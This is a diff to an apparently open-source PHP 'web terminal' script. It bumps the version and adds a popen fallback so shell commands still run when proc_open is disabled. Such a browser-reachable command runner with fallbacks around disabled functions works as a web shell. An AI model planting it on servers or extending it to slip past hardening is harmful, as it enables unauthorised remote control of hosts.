@@ -2,7 +2,7 @@
 /**
  * PHP Web Terminal
  *
- * @version 1.2.3
+ * @version 1.2.4
  * @pv.pat [Original Author] - Updated by @pinoyvendetta
  * @link https://github.com/pinoyvendetta/php-web-terminal
  *
@@ -21,7 +21,7 @@ set_time_limit(0); // Allow script to run indefinitely for long tasks
 ob_implicit_flush(); // Ensure output is sent immediately
 
 // --- Version Information ---
-$version = '1.2.3';
+$version = '1.2.4';
 
 // --- System Detection ---
 $is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
@@ -63,6 +63,16 @@ function execute_command($command, $cwd) {
             $output .= stream_get_contents($pipes[2]); fclose($pipes[2]);
             proc_close($process);
         } else { $output = "Error: proc_open failed."; }
+    } elseif (is_function_enabled('popen')) {
+        $handle = popen($full_command, 'r');
+        if ($handle) {
+            while (!feof($handle)) {
+                $output .= fread($handle, 8192);
+            }
+            pclose($handle);
+        } else {
+            $output = "Error: popen failed to execute command.";
+        }
     } elseif (is_function_enabled('passthru')) {
         ob_start();
         passthru($full_command, $return_var);
